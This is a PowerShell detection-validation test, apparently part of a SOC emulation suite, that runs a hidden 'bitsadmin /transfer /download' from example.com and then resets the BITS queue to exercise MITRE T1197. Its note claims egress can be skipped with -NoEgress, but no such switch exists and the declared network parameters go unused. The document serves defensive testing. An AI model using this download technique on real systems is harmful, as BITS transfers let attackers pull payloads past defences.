﻿#Requires -Version 5.1
# Test-SOC1141 :: BitsAdmin external transfer (bitsadmin /transfer /download https)
# MITRE T1197 (Command and Control)  |  kind=proc  |  BENIGN validation
function Test-SOC1141 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'bitsadmin /transfer ATRVAL_%RID% /download /priority normal https://example.com/ATRVAL_%RID% %WD%\bits_%RID%.bin'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $pc = Expand-AtrTokens 'bitsadmin /reset'
    $pexe = ($pc -split ' ',2)[0]; $parg = ($pc -split ' ',2)[1]
    if ($pexe -notmatch '\\|:') { $pexe = "$env:SystemRoot\System32\$pexe"; if(-not $pexe.ToLower().EndsWith('.exe')){$pexe+='.exe'} }
    $null = Invoke-AtrProc -FilePath $pexe -Arguments $parg -Hidden -TimeoutSec 20
    $status = if($ok){'RAN'}else{'PARTIAL'}
    $detail = $detail + ' | note: ' + 'Attempts one benign GET to example.com then resets the queue; minor egress. Skip with -NoEgress.'
    return (New-AtrResult 'SOC1141' 'BitsAdmin external transfer (bitsadmin /transfer /download https)' 'Command and Control' 'T1197' $status $detail $marker)
}
